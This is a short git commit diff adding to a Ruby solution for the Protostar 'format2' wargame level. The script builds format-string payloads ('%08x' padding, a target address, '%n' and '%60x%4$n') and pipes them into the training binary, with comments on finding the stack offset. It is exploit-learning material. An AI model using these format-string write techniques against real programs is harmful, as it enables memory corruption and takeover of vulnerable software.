92d373b46c3976cf2ddef3f561745525fc7aa29d
Senri <kurususenri@outlook.com>
2022-03-29 09:18:08 +0800

    fixed format2

--- format2/format2.rb
+++ format2/format2.rb
@@ -4,3 +4,17 @@ target = "\xe4\x96\x04\x08"
 stdin = "XXXX" + ("%08x" * 3) + target + ("%08x" * 4) + "%n"
 command = "echo #{stdin} | /opt/protostar/bin/format2"
 puts `#{command}`
+
+# same
+stdin = target + "%60x%4$n"
+# test = "ABCD" + "%08x|" * 10
+# command = "echo '#{test}' | /opt/protostar/bin/format2"
+# puts `#{command}`
+# ^result: ABCD00000200|b7fd8420|bffff5e4|44434241|78383025|3830257c|30257c78|257c783....
+# as for %60x%4$n :
+# 4$n will choose the forth arguments which is 44434241 and we can replace it with 080496e4 
+# %60x will print 60 bytes
+# and 60 + 4 = 64 bytes
+# single quotation marks, so echo will not treat $n as a variable
+command = "echo '#{stdin}' | /opt/protostar/bin/format2"
+puts `#{command}`
